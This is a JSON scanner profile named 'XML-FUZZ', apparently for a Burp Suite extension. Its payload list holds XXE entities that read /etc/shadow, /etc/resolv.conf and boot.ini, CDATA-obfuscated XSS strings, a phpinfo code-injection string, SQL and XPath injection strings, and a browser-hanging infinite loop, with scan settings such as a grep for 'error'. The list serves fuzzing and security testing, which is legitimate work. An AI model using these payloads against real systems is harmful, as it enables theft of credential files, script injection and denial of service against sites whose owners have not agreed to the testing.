[{"Name":"XML-FUZZ","Enabled":true,"Scanner":1,"Payloads":["\u003c![CDATA[\u003cscript\u003evar n\u003d0;while(true){n++;}\u003c/script\u003e]]\u003e","\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003cfoo\u003e\u003c![CDATA[\u003c]]\u003eSCRIPT\u003c![CDATA[\u003e]]\u003ealert(\u0027gotcha\u0027);\u003c![CDATA[\u003c]]\u003e/SCRIPT\u003c![CDATA[\u003e]]\u003e\u003c/foo\u003e","\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003cfoo\u003e\u003c![CDATA[\u0027 or 1\u003d1 or \u0027\u0027\u003d\u0027]]\u003e\u003c/foof\u003e","\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file://c:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e","\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e","\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/shadow\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e","\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///dev/random\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e","\u003c!DOCTYPE autofillupload [\u003c!ENTITY D71Mn SYSTEM \"file:///c:/boot.ini\"\u003e","]\u003e","\u003c!DOCTYPE autofillupload [\u003c!ENTITY 9eTVC SYSTEM \"file:///etc/resolv.conf\"\u003e","]\u003e","\"\u003cxml ID\u003dI\u003e\u003cX\u003e\u003cC\u003e\u003c![CDATA[\u003cIMG SRC\u003d\"\"javas]]\u003e\u003c![CDATA[cript:alert(\u0027XSS\u0027);\"\"\u003e]]\u003e\"","\"\u003cxml ID\u003d\"\"xss\"\"\u003e\u003cI\u003e\u003cB\u003e\u003cIMG SRC\u003d\"\"javas\u003c!-- --\u003ecript:alert(\u0027XSS\u0027)\"\"\u003e\u003c/B\u003e\u003c/I\u003e\u003c/xml\u003e\u003cSPAN DATASRC\u003d\"\"#xss\"\" DATAFLD\u003d\"\"B\"\" DATAFORMATAS\u003d\"\"HTML\"\"\u003e\u003c/SPAN\u003e\u003c/C\u003e\u003c/X\u003e\u003c/xml\u003e\u003cSPAN DATASRC\u003d#I DATAFLD\u003dC DATAFORMATAS\u003dHTML\u003e\u003c/SPAN\u003e\"","\"\u003cxml SRC\u003d\"\"xsstest.xml\"\" ID\u003dI\u003e\u003c/xml\u003e\u003cSPAN DATASRC\u003d#I DATAFLD\u003dC DATAFORMATAS\u003dHTML\u003e\u003c/SPAN\u003e\"","\"\u003cHTML xmlns:xss\u003e\u003c?import namespace\u003d\"\"xss\"\" implementation\u003d\"\"http://example.com/xss.htc\"\"\u003e\u003cxss:xss\u003eXSS\u003c/xss:xss\u003e\u003c/HTML\u003e\"","\u003cname\u003e\u0027,\u0027\u0027)); phpinfo(); exit;/*\u003c/name\u003e","## Element and Attrib Values","null","*","%","@","$","-","+",";",":","0","-1","1","0.1","0.9","true","false","1.7976931348623157e+308","5e-324","0.00005","5e-10","\u0026apos;XoiZR","\u0026quot;XoiZR","\u0026lt;Tnn96\u0026gt;","\u0026lt;?Tnn96 ?\u0026gt;","\u0026lt;? Tnn96 ?\u0026gt;","\u0026lt;% Tnn96 %\u0026gt;","\u0026lt;%\u003d Tnn96 %\u0026gt;","[Tnn96]","(Tnn96)","{Tnn96}","{{Tnn96}}","{\u003d Tnn96}","{{\u003d Tnn96}}","\u0027 or \u00271\u0027\u003d\u00271","\u0027 or \u0027\u0027\u003d\u0027","x\u0027 or 1\u003d1 or \u0027x\u0027\u003d\u0027y","/","//","//*","*/*","@*","count(/child::node())","x\u0027 or name()\u003d\u0027username\u0027 or \u0027x\u0027\u003d\u0027y"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":["error"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"0","isTime":false,"iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":1,"RedirType":0,"MaxRedir":0,"payloadPosition":0,"IssueName":"XML-FUZZ","IssueSeverity":"Information","IssueConfidence":"Certain","IssueDetail":"XML-FUZZ\n\n\u003cgrep\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Scantype":0,"pathDiscovery":false}]